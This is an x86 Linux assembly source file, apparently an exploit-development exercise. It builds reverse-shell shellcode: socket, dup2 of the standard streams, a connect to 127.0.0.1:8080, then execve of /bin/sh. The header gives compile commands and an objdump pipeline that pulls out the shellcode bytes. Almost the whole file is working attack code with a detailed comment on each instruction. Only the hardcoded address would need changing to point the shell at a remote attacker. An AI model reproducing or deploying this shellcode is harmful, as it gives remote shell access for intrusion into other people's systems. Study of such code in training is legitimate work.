; Author :  Alessio Parzian
; Filename: rev_shell.asm

; compile with:
; 	nasm -f elf32 rev_shell.asm
;	ld -o rev_shell rev_shell.o
; extract shellcode with:
; 	objdump -d rev_shell | grep -Po '\s\K[a-f0-9]{2}(?=\s)' | sed 's/^/\\x/g' | perl -pe 's/\r?\n//' | sed 's/$/\n/'

global _start

section .text

	_start:
		;
		; Syscall numbers for x86 can be found: /usr/include/i386-linux-gnu/asm/unistd_32.h
		;
		; ==================
		; prepare registries
		; ==================
		mov ebp,esp		 		; zeroing register
		xor eax,eax		 		; zeroing register
		xor ebx,ebx		 		; zeroing register
		xor ecx,ecx		 		; zeroing register
		xor edx,edx		 		; zeroing register
		xor esi,esi		 		; zeroing register
		; ==================
		; socket syscall
		; ==================
		; > man 2 socket 
		; int socket(int domain, int type, int protocol);
		; 	AF_INET is defined as 2 as listed in /usr/include/asm-generic/socket.h
		; 	SOCK_STREAM is defined as 1 as listed in /usr/include/asm-generic/socket.h
		; ------------------
		mov ax, 0x167 	 		; syscall number
		mov bl, 0x2		 		; AF_INET - IPv4 Internet protocols
		mov cl, 0x1		 		; SOCK_STREAM - Provides sequenced, reliable, two-way, connection-based byte streams.  An out-of-band data transmission mechanism may be supported.
						 		; edx is left to 0 as no additional flag is required to be set for our goal
		int 0x80		 		; interrupt to ask for syscall execution
		mov esi, eax	 		; save socket file descriptor to ESI register
		; ==================
		; dup2 syscall
		; ==================
		; > man 2 dup2
		; int dup2(int oldfd, int newfd);
		; ------------------
		mov ebx, esi	 		; move the file descriptor for the accepted socket as parameter
		xor ecx, ecx	 		; zeroing register
		mov cl, 0x3		 		; set counter for loop, three loops are executed for stdin, stdout, stderr
		dupin:
		    xor eax, eax 		; zeroing out eax
		    mov al, 0x3f 		; syscall number - dup2
		    dec cl       		; decreasing loop counter 
		    int 0x80     		; interrupt to ask for syscall execution
		    jnz dupin    		; if the zero flag is not set then do it again
		; ==================
		; connect syscall
		; ==================
		; > man 2 connect
		; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
		; ------------------
		add ax, 0x16a			; syscall number
		mov ebx, esi			; move the socket file descriptor as syscall parameter
		push 0x0100007f  		; uint32_t s_addr (4 bytes) in little endian, 0x0100007f is 127.0.0.1
		push word 0x901f 		; in_port_t sin_port (2 bytes) in little endian, 0x1f90 is 8080 
		push word 0x02	 		; sa_family_t sin_family (2 bytes), AF_INET - IPv4 Internet protocols
		mov ecx, esp	 		; move the address of esp as syscall parameter as a mean to access the struct just saved in the stack
		xor edx, edx			; zeroing register
		add edx, 0x10	 		; socklen_t addrlen (16 bytes) is the size of the struct saved  
		int 0x80				; interrupt to ask for syscall execution
		; ==================
		; execve syscall
		; ==================
		; > man 2 execve
		;  int execve(const char *filename, char *const argv[], char *const envp[]);
		; ------------------
		xor eax, eax	 		; zeroing out eax
		push eax		 		; push null byte onto the stack
		mov al, 0x0b	 		; syscall number 
		push 0x68732f6e  		; push on the stack the name of the program, /bin/sh to executed in little endian - hs/n
		push 0x69622f2f  		; push on the stack the name of the program, /bin/sh to executed in little endian - ib// (double / for padding)
		mov ebx, esp	 		; move the address of esp as syscall perameter as a mean to access the program name
		xor edi, edi	 		; zeroing register
		push edi 	     		; push on the stack a null argv
		mov edx, esp	 		; move the address of esp as syscall perameter as a mean to access the argv value
		push ebx         		; push "//bin/sh,0x00000000" back to the stack as envp 
		mov  ecx, esp    		; move the address of esp as syscall perameter as a mean to access the envp value
		int 0x80	     		; interrupt to ask for syscall execution

		





	